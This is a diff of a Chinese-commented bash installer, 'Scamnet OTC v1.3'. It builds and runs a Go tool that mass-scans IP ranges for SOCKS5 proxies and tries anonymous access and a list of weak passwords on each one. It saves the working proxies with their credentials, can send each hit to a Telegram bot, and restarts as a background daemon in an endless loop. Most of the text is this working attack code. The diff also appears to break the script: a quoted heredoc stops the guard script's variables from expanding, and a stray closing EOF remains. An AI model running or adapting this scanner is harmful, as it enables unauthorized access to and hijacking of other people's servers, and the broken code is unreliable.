@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v1.3（日志极致优化 + 进度条移除 + 自动轮转）
+# main.sh - Scamnet OTC v1.3（日志极致优化 + 自动轮转）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -39,9 +39,9 @@ echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-log "正在编译 Go 扫描器（日志优化版）..."
+log "正在编译 Go 扫描器（FINAL 优化版）..."
 
-# ============ 优化的 Go 源码开始 ============
+# ============ 完全修复的 Go 源码（无 atomic、无进度条） ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -61,7 +61,6 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"sync/atomic"
 	"time"
 
 	"golang.org/x/sync/semaphore"
@@ -79,11 +78,11 @@ type Config struct {
 }
 
 var (
-	cfg       Config
-	validFile = "socks5_valid.txt"
-	seen      = sync.Map{}
-	stats     = make(map[string]int)
-	statsMu   sync.Mutex
+	cfg          Config
+	validFile    = "socks5_valid.txt"
+	seen         = sync.Map{}
+	stats        = make(map[string]int)
+	statsMu      sync.Mutex
 	countryCache = sync.Map{}
 )
 
@@ -174,7 +173,7 @@ func main() {
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.3 LOG-OPTIMIZED - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.3 FINAL - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
@@ -182,7 +181,6 @@ func main() {
 		if batchEnd > total {
 			batchEnd = total
 		}
-		// 仅打印批次信息，不打印进度条
 		fmt.Printf("[*] 批次 %d/%d → %d tasks\n", batchStart/uint64(cfg.BatchSize)+1, batchCount, batchEnd-batchStart)
 		scanBatchByIndex(start, end, ports, batchStart, batchEnd)
 	}
@@ -228,12 +226,10 @@ func scanTarget(target string) {
 	ip := parts[0]
 	port, _ := strconv.Atoi(parts[1])
 
-	// 先测匿名
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
 		saveAndNotify(ip, port, "", "", origin, lat)
 		return
 	}
-	// 再测弱口令
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
@@ -293,7 +289,6 @@ func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
 	stats[country]++
 	statsMu.Unlock()
 
-	// 仅打印成功信息
 	fmt.Printf("[+] %s (%dms)\n", result, lat)
 
 	if cfg.TelegramToken != "" {
@@ -354,7 +349,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.3 LOG-OPTIMIZED - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.3 FINAL - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	for _, l := range sorted {
 		out.WriteString(l + "\n")
 	}
@@ -406,46 +401,48 @@ go get golang.org/x/sync/semaphore 2>/dev/null || true
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
 succ "Go 扫描器编译完成 → $GO_BIN"
 
-# ============ 优化后的守卫脚本（日志轮转 + 过滤） ============
+# ============ 最终守卫脚本：日志轮转 + 仅记录成功 ============
 GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
-cat > "$GUARD_SCRIPT" << EOF
+cat > "$GUARD_SCRIPT" << 'EOF'
 #!/bin/bash
 LOG="$LATEST_LOG"
 MAX_LINES=500
 
 # 清空旧日志
-> "\$LOG"
-echo "[GUARD] \$(date) - 日志优化模式启动" | tee -a "\$LOG"
-echo "[GUARD] 范围: $START_IP ~ $END_IP | 端口: $PORTS" | tee -a "\$LOG"
+> "$LOG"
+echo "[GUARD] $(date) - Scamnet FINAL 启动" | tee -a "$LOG"
+echo "[GUARD] 范围: $START_IP ~ $END_IP | 端口: $PORTS" | tee -a "$LOG"
 
 while :; do
-    echo "[GUARD] \$(date) - 开始新一轮扫描..." | tee -a "\$LOG"
+    echo "[GUARD] $(date) - 开始扫描..." | tee -a "$LOG"
 
-    $GO_BIN \\
-        -start "$START_IP" \\
-        -end "$END_IP" \\
-        -ports "$PORTS" \\
-        -tg-token "$TELEGRAM_TOKEN" \\
-        -tg-chat "$TELEGRAM_CHATID" \\
-        -batch 250 \\
-        -conc 150 \\
-        -timeout 6 \\
-        2>&1 | grep -E '^\\\[\\\+\\\]|\\[GUARD\\\]' | tee -a "\$LOG"
+    $GO_BIN \
+        -start "$START_IP" \
+        -end "$END_IP" \
+        -ports "$PORTS" \
+        -tg-token "$TELEGRAM_TOKEN" \
+        -tg-chat "$TELEGRAM_CHATID" \
+        -batch 250 \
+        -conc 150 \
+        -timeout 6 \
+        2>&1 | grep -E '^\[\+\]|\[GUARD\]' | tee -a "$LOG"
 
-    # 保留最后 \$MAX_LINES 行
-    if command -v tail >/dev/null; then
-        tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" && mv "\$LOG.tmp" "\$LOG"
-    fi
+    # 保留最后 500 行
+    tail -n "$MAX_LINES" "$LOG" > "$LOG.tmp" 2>/dev/null && mv "$LOG.tmp" "$LOG"
 
-    echo "[GUARD] \$(date) - 本轮结束，3秒后重启..." | tee -a "\$LOG"
+    echo "[GUARD] $(date) - 本轮结束，3秒后重启..." | tee -a "$LOG"
     sleep 3
 done
 EOF
 chmod +x "$GUARD_SCRIPT"
 
+# 停止旧进程 + 启动新版
 pkill -f "scamnet_guard.sh" 2>/dev/null || true
+sleep 1
 nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
-succ "守护进程启动！PID: $!"
-log "日志: tail -f $LATEST_LOG  (已优化，最多 500 行)"
+succ "守护进程已启动！PID: $!"
+log "日志: tail -f $LATEST_LOG  (仅 500 行)"
 log "停止: pkill -f scamnet_guard.sh"
-log "结果: $VALID_FILE"
+log "结果: cat $VALID_FILE"
+log "空间释放: > $LATEST_LOG"
+EOF
